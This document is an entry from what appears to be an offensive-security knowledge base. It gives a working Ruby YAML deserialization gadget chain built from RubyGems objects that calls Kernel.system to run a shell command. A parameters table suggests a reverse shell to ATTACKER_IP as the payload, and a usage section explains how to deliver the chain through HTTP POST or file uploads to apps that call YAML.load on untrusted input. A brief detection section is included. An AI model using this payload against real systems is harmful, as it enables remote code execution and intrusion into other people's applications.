---
id: a4d530da-0e9d-440b-b31a-de164403ecbe
type: code
language: yaml
verified: true
created_at: '2023-04-06T03:55:59.522982+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - '[[tags/Ruby]]'
  - '[[tags/YAML-Deserialization]]'
  - '[[tags/RCE]]'
  - '[[tags/Gadget-Chain]]'
platforms:
  - Linux
  - Web
validated: true
---

# Ruby-YAML-Deserialization-Gadget-for-System-Command

## Code

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: sleep 600
         method_id: :resolve
```

## Description

This YAML code snippet is a deserialization gadget chain targeting Ruby's YAML parser. It constructs a series of interconnected objects from the RubyGems library to exploit the deserialization process, ultimately invoking the `Kernel.system` method to execute an arbitrary shell command. The chain uses object references (e.g., `&1`) to link components, leading to method resolution that triggers system execution. In this example, it runs `sleep 600` as a proof-of-concept; attackers modify it for malicious commands like reverse shells.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| git_set | The shell command to execute via system() | `sleep 600` or `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` |

## Usage

Embed this YAML in user-controlled input to a Ruby app that calls `YAML.load` on untrusted data, such as API parameters or uploaded files. Deliver via HTTP POST with `Content-Type: application/x-yaml` or as a file upload. Test locally in a sandbox with `ruby -ryaml -e 'YAML.load STDIN.read'` piping the YAML. Used in procedures like [[procedures/Exploit-YAML-Deserialization-in-Ruby-for-RCE]] for initial RCE in web applications.

## Detection

- Application logs showing deserialization of unexpected classes (e.g., Gem::Installer, Net::BufferedIO).
- Anomalous process spawns from Ruby processes (e.g., via `ps aux | grep ruby` or EDR tools).
- YAML input validation failures or gadget chain patterns in WAF logs.
- File system changes or network callbacks triggered by the payload command.

## Related

- [[procedures/Exploit-YAML-Deserialization-in-Ruby-for-RCE]]
